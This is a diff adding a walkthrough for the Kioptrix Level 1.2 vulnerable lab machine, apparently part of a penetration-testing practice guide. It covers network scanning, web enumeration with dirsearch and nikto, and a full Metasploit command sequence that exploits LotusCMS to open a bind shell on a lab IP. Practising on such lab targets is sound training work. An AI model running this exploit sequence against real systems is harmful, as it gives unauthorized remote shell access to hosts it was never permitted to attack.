@@ -146,3 +146,63 @@ Compiling the exploit using GCC, allocating execute permissions to it and execut
 Now we are in the root!
 
 <h1>Kioptrix Level 1.2(3)</h1>
+
+Step 1:
+Follow Step 1 & Step 2 from previous one as described to set the machine up and discovering machine IP.
+
+Step 2:
+Before we move any further, we better add the domain/ip in ***/etc/hosts*** file in case, we can't reach the requested page.
+
+![image](https://user-images.githubusercontent.com/31168741/199953402-8d1b9972-159e-4dac-8c3e-7e064a29f61f.png)
+![image](https://user-images.githubusercontent.com/31168741/199953427-1d9eda09-61e0-40ed-8ce9-da02fd13b5c0.png)
+
+Step 3:
+Run nmap scan on the machine IP that we found.
+
+`sudo nmap -sS -A -p- [machine-ip] -T4`
+
+![image](https://user-images.githubusercontent.com/31168741/199953516-281d5a6a-8555-4b3b-b94f-af3abcd363bd.png)
+
+Step 5:
+Running some other tools to enumerate as much information as possible from the machine.
+
+`dirsearch -u http://[machine-ip]`
+
+![image](https://user-images.githubusercontent.com/31168741/199953683-e4ceae80-caa4-4c6a-abf8-0d96fd478bdf.png)
+
+`nikto -h [machine-ip]`
+
+![image](https://user-images.githubusercontent.com/31168741/199953794-9606b92d-cc20-418a-bcbb-48a46a144cdc.png)
+
+Step 6:
+Just as before, let’s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80
+
+![image](https://user-images.githubusercontent.com/31168741/199954089-d3bd781b-5f7e-40d7-94aa-8b6c282e9511.png)
+
+So, a home page!
+
+![image](https://user-images.githubusercontent.com/31168741/199954135-1682ec5b-2cc0-40f9-a9b8-082947f98887.png)
+
+Then, a login form. Interesting!
+
+![image](https://user-images.githubusercontent.com/31168741/199954281-f0aa41bb-c4ff-4168-a6a0-cb6a3955fcf1.png)
+
+We could always try the step above if something lies there, will show up! Seems the effort didn't go in vain at all.
+
+Step 7: Exploitation
+
+`searchsploit lotuscms`
+
+![image](https://user-images.githubusercontent.com/31168741/199954445-0f392e2b-26e6-42ee-b86b-e0861af6de3e.png)
+
+***Setting up the options:***
+
+>msfconsole
+>search lotuscms
+>use exploit/multi/http/lcms_php_exec
+>show options
+>set RHOSTS 192.168.100.80
+>set LHOST 192.168.100.164
+>set PAYLOAD generic/shell_bind_tcp
+>set URI /
+>exploit
